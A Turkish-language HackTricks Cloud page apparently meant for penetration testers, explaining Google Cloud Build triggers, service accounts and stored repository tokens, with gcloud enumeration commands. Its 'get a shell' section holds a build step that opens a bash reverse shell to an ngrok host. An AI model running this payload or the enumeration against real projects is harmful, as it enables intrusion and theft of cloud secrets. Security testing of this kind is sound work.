# GCP - Cloud Build Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

## Temel Bilgiler

Google Cloud Build, **yazılım oluşturma** ve yayınlama süreçlerini otomatikleştiren bir yönetilen CI/CD platformudur. **Kaynak kod depolarıyla entegre olan** ve geniş bir programlama dilini destekleyen bir platformdur. Geliştiricilere kodu otomatik olarak oluşturma, test etme ve dağıtma imkanı sağlar ve aynı zamanda oluşturma adımlarını ve iş akışlarını özelleştirme esnekliği sunar.

Her Cloud Build Tetikleyici, bir Cloud Deposu ile ilişkilidir veya harici bir depo ile doğrudan bağlantılıdır (Github, Bitbucket ve Gitlab).

{% hint style="success" %}
Buradan veya Bulut Depolarından Github/Bitbucket belirteci çalmak için herhangi bir yol göremedim çünkü repo indirildiğinde [https://source.cloud.google.com/](https://source.cloud.google.com/) URL'si üzerinden erişilir ve Github istemci tarafından erişilmez.
{% endhint %}

### Olaylar

Cloud Build, aşağıdaki durumlarda tetiklenebilir:

* **Bir dalda itme**: Dalı belirtin
* **Yeni bir etiket itme**: Etiketi belirtin
* **Çekme isteği**: PR'yi alan dalı belirtin
* **Manuel çağrı**
* **Pub/Sub mesajı:** Konuyu belirtin
* **Webhook olayı**: Bir HTTPS URL'si açığa çıkarır ve istek bir sır ile kimlik doğrulaması yapmalıdır

### Yürütme

3 seçenek vardır:

* Komutları belirten bir yaml/json. Genellikle: `/cloudbuild.yaml`
* Web konsolunda ve cli'de "inline" olarak belirtilebilen tek seçenek
* En yaygın seçenek
* Kimlik doğrulaması yapılmamış erişim için önemlidir
* Oluşturmak için bir **Dockerfile**
* Oluşturmak için bir **Buildpack**

### SA İzinleri

**Hizmet Hesabı, `cloud-platform` kapsamına sahiptir**, bu nedenle **tüm yetkileri kullanabilir**. **Bir SA belirtilmezse** (örneğin, gönderme işlemi yapılırken) **varsayılan SA** `<proj-numarası>@cloudbuild.gserviceaccount.com` **kullanılır.**

Varsayılan olarak hiçbir izin verilmez, ancak bazı izinler vermek oldukça kolaydır:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Onaylar

Bir Cloud Build, oluşturma işlemleri için onay gerektirecek şekilde yapılandırılabilir (varsayılan olarak devre dışı).

### Bağlantılar ve Depolar

Bağlantılar şunlar üzerinden oluşturulabilir:

* **GitHub:** İzinler için bir OAuth iletişim kutusu gösterecektir ve **Github belirteci almak** için izin isteyecektir. Bu belirteç, **Secret Manager** içinde depolanacaktır.
* **GitHub Enterprise:** Bir **GithubApp** yüklemek için isteyecektir. GitHub Enterprise ana bilgisayarınızdan bir **kimlik doğrulama belirteci** oluşturulacak ve bu projede bir **Secret Manager** sırrı olarak depolanacaktır.
* **GitLab / Enterprise:** API erişim belirteci ve Okuma API erişim belirteci sağlamanız gerekmektedir ve bunlar **Secret Manager** içinde depolanacaktır.

Bir bağlantı oluşturulduktan sonra, Github hesabının erişimine sahip olduğu depoları bağlamak için kullanabilirsiniz.

Bu seçenek düğmesiyle kullanılabilir:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Bu yöntemle bağlantılı depoların yalnızca 2. nesil kullanarak Tetikleyicilerde mevcut olduğunu unutmayın.
{% endhint %}

### Bir Depo Bağlama

Bu, bir **`bağlantı`** ile aynı değildir. Bu, **Github veya Bitbucket** deposuna erişim sağlamanın **farklı** yollarını sağlar, ancak bir bağlantı nesnesi oluşturmaz, ancak bir depo nesnesi (1. nesil) oluşturur.

Bu seçenek düğmesiyle kullanılabilir:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Depolama

Bazen Cloud Build, tetikleyici için dosyaları depolamak için **yeni bir depolama oluşturur**. Bu örnekte olduğu gibi GCP'nin sunduğu örnekte olduğu gibi.
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Bir `.tgz` dosyasıyla kullanılacak dosyaları depolamak için [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) adında bir Depolama kovası oluşturulur.

### Kabuk alın
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Saptama

Build yapılandırmalarında ve günlüklerde **hassas bilgiler bulabilirsiniz**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Yetki Yükseltme

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Kimlik Doğrulamasız Erişim

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Saldırı Sonrası

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
